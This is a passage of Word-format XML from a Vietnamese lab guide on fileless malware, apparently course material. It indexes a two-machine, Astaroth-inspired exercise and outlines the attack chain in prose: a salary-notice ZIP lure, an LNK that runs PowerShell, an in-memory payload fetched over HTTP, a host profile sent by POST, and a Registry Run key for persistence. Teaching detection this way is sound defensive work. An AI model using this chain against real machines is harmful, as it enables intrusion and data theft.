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6"/>
        </w:rPr>
        <w:t>Hướng dẫn cài đặt và thực hiện lab Fileless Malware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Lab Astaroth-inspired trên hai máy với LNK, PowerShell và in-memory payload execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="200"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Tài liệu này gộp phần chuẩn bị môi trường, các bước thực hiện lab, cách quan sát log và hướng dẫn cleanup. Lab chỉ dùng payload vô hại trong mạng nội bộ, không mô phỏng đánh cắp dữ liệu, C2 thật hoặc bypass antivirus. Persistence được mô phỏng bằng Registry Run key dễ thấy, có mục đích retry và có hướng dẫn cleanup rõ ràng.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:t>Namespace Lab Fileless Malware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Đây là namespace tài liệu cho đề tài </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>Fileless Malware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">. Mục tiêu là giúp người mới đi từ khái niệm cơ bản đến một demo lab an toàn theo hướng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>Astaroth-inspired Living-off-the-Land</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lưu ý quan trọng: lab trong namespace này là bản mô phỏng an toàn, rút gọn để học log và detection. Nó không tái hiện đầy đủ chuỗi Astaroth thật được Microsoft mô tả.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Bản lab hiện tại</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bản lab hiện tại dùng mô hình hai máy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Attacker: Windows thật, IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Victim: Windows VM, IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.140</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Luồng chính:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Victim tải ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; giải nén ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; double click LNK</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; LNK gọi powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; PowerShell tải payload.ps1 từ attacker qua HTTP</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; nội dung payload được giữ trong RAM</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; PowerShell tạo ScriptBlock và thực thi</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; payload thu thập profile máy không nhạy cảm</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; payload gửi JSON về attacker qua POST /collect trên port 8001</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; nếu collector 8001 không chạy, payload lưu profile vào %TEMP%\FilelessLab\queue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; khi có mạng lại, payload gửi queue về attacker</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; payload tạo Registry Run key vô hại để mô phỏng persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Điểm quan trọng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không dùng mã độc thật.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không dùng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không dùng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>certutil -decode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không tạo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload thu thập thông tin máy không nhạy cảm như hostname, username, OS version và IP nội bộ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload không lấy password, cookie, token, clipboard, browser data hoặc tài liệu cá nhân.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Offline staging chỉ lưu profile không nhạy cảm tại </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Persistence chỉ là Registry Run key vô hại để mô phỏng retry, có cleanup rõ ràng.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>ZIP và LNK vẫn tồn tại trên victim, nhưng payload không được lưu thành file trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Victim không thấy popup/success rõ ràng; người làm lab xác nhận thành công bằng log </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên collector port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> và file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>collections\victim-profile-*.json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Cách đọc nhanh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Đọc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>01-chuan-bi-moi-truong.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để chuẩn bị VM, Sysmon, PowerShell logging, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> và network.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Đọc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>02-lab-2-may-astaroth-style.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để tạo payload, tạo LNK, zip LNK và chạy lab hai máy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Đọc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>03-detection-phong-thu.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để hiểu cách đọc Sysmon, PowerShell 4104 và logic phát hiện.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Đọc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>04-cleanup-va-viet-bao-cao.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để dọn lab, export log và viết phần kết quả.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Nguyên tắc an toàn</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không dùng sample mã độc thật.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không tải payload từ Internet không tin cậy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không chạy victim trực tiếp trên máy chính.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chỉ dùng payload vô hại.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không hướng dẫn bypass antivirus.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chỉ mô phỏng hành vi để học cách phát hiện qua log.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Các file trong namespace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>README.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: trang chỉ mục.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>01-chuan-bi-moi-truong.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">: chuẩn bị VM, Sysmon, logging và </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>02-lab-2-may-astaroth-style.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: lab 2 máy, attacker host ZIP/payload và victim mở LNK.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>03-detection-phong-thu.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: cách đọc log, detection logic, Sigma mẫu và phòng thủ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>04-cleanup-va-viet-bao-cao.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: cleanup lab và gợi ý viết Chương 3.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>lab-files/attacker-web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">: bộ file mẫu để copy sang </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ghi chú về file cũ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Một số file cũ như </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>02-lab-astaroth-style.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> hoặc tài liệu nháp trước đây có thể vẫn nhắc đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>wmic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
